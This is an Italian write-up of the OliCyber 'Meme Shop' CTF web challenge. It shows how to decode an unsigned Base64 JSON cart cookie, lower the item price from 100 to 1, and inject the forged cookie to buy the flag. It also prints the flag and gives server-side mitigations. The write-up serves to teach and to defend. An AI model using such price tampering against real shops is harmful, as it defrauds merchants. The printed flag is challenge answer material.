# Writeup Challenge: Meme Shop

**Target:** `http://meme_shop.challs.olicyber.it/`

**Flag:** `flag{m3m3_5h0p_m4_p3r_1l_m3m3_51_5ch3rz4_4m1c1_d3ll4_p0574l3}`

**Categoria:** Web Security / Parameter Tampering & Insecure Client-Side State Management (Business Logic Flaw)

---

### Obiettivo

Acquistare l'articolo speciale **"flag"** al costo di **100 €** partendo da un credito iniziale limitato a soli **10 €**.

---

### Analisi della Vulnerabilità

1. **Gestione del Carrello Client-Side:**
Aggiungendo articoli al carrello, il backend non mantiene una sessione centralizzata né registra lo stato sul database lato server. Lo stato del carrello viene invece interamente delegato al browser tramite il cookie HTTP `cart`.
2. **Analisi e Decodifica del Cookie (CyberChef):**
Ispezionando i cookie tramite DevTools (**F12** > **Application/Storage**), il cookie `cart` presentava una stringa codificata in Base64:

```text
eyJmbGFnIjp7InByaWNlIjoxMDAsInF0eSI6MSwiaXRlbV9pZCI6MX19...

```

Caricando la stringa all'interno di **CyberChef** e applicando l'operazione `From Base64`, è emersa la struttura serializzata in formato JSON:

```json
{
  "flag": {
    "price": 100,
    "qty": 1,
    "item_id": 1
  }
}

```

1. **Mancanza di Firma di Integrità:**
Il JSON non è protetto da alcuna firma crittografica (MAC/HMAC) né cifratura. Il backend si limita a fare il parse del JSON contenuto nel cookie e ad accettare il campo `price` come valore attendibile durante il checkout.

---

### Risoluzione ed Exploitation con CyberChef

Per eseguire il **Price Tampering**:

1. **Manipolazione del Payload JSON:**
Modifica del valore della chiave `price` da `100` a `1`:

```json
{
  "flag": {
    "price": 1,
    "qty": 1,
    "item_id": 1
  }
}

```

1. **Ricodifica in Base64:**
Utilizzando la ricetta `To Base64` su **CyberChef**, è stata generata la nuova stringa da iniettare nel cookie:

```text
eyJmbGFnIjp7InByaWNlIjoxLCJxdHkiOjEsIml0ZW1faWQiOjF9fQ==

```

1. **Cookie Injection e Checkout:**

* Sostituzione del valore originale del cookie `cart` con la stringa contraffatta tramite i DevTools del browser.
* Ricaricamento della pagina (`F5`): il carrello mostra ora la flag al prezzo modificato di **1 €**.
* Completamento del checkout con il credito residuo disponibile (10 €).

---

### Risultato

Il server valida l'acquisto sottraendo il prezzo manomesso (1 €) dal bilancio utente e rilascia la flag:

```text
flag{m3m3_5h0p_m4_p3r_1l_m3m3_51_5ch3rz4_4m1c1_d3ll4_p0574l3}

```

---

### Mitigazione (Best Practice)

* **Prezzi autoritativi lato server:** Il prezzo dei prodotti non deve mai essere memorizzato o validato in base a dati provenienti dal client (né in cookie, né in campi form). Il client deve trasmettere unicamente l'`item_id` e la quantità; il server calcola il totale leggendo i prezzi dal proprio catalogo/database.
* **Cookie crittograficamente firmati:** Qualora fosse necessario memorizzare lo stato della sessione interamente sul client (approccio cookie-session), i dati devono essere firmati crittograficamente con una chiave segreta memorizzata sul server (es. HMAC), in modo che qualsiasi manomissione invalidi automaticamente il cookie.
